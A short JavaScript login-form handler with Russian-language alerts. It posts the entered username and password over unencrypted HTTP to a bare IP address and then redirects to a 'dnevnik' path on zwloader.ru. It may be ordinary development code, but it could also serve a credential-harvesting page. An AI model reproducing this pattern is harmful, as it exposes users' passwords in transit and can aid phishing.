document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    let user_data = new URLSearchParams();
    user_data.append('username', username);
    user_data.append('password', password);

    fetch('http://188.92.199.214:7555/api/v1/auth/test-login'/*'https://zwloader.ru/api/v1/chat/'*/, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: user_data.toString(),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok ' + response.statusText);
        }
        return response.json();
    })
    .then(user_data => {
        console.log('Success:', user_data);
        alert('Вход прошел успешно!');
        window.location.href = "http://zwloader.ru/dnevnik/";
    })
    .catch(error => {
        console.error('There was a problem with the fetch operation:', error);
        alert('Произошла ошибка при входе. Попробуйте еще раз.');
    });
});
